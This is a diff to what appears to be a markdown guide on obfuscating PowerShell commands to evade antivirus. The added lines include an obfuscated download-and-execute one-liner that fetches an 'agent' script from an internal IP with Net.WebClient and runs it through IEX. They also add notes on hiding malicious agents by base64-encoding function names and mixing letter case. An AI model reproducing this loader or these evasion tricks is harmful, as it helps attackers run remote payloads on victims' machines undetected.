@@ -299,7 +299,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       after the -f switch.. HINT: {0} == {vice} | {3} == {et-} | {1} == {Ser} | {2} == {G}
       [Special thanks to: @danielbohannon]
 
-- Using splatting + reorder (-f) obfuscation technic
+- Using **splatting + reorder** (-f) obfuscation technic
 
       ("{0}{2}{1}{3}" -f'vice','Ser','G','et-')
       OUTPUT: Get-Service
@@ -313,10 +313,11 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 ---
 
-                                      - FINAL NOTES -
+- Another way to use **splatting + reorder** technic to remote download/execute agent
 
-      95% of the obfuscation technics in the 'powershell' section contained in this article are
-      based in the exelent 'Invoke-Obfuscation' powershell cmdlet develop by: @danielbohannon.
+      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Downnload','http://','lie') | I`EX
+
+![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)
 
 ---
 
@@ -476,6 +477,23 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 **@danielbohannon** **@Andy Green** **@404death**<br />
 **@daniel sauder(avet)** **@Wandoelmo Silva** and<br />
 **@Muhammad Samaak <-- for is contributions to this project ^_^**
+
+<br />
+
+---
+
+                                      - FINAL NOTES -
+
+      95% of the obfuscation technics in the 'powershell' section contained in this article are
+      based in the exelent 'Invoke-Obfuscation' powershell cmdlet develop by: @danielbohannon.
+
+      Also keep in mind of the most common obfuscations technics like write a file on disk before
+      executing any malicious actions (agent execution) replace any main functions (syscall's)
+      by base64 encoded strings, and store them inside your script (agent) as local variables
+      to be called at runtime execution and the last but not least, Concatenate also function
+      names to use big and small letters (eg PoWeRshElL.exE). 
+
+---
 
 <br />
 
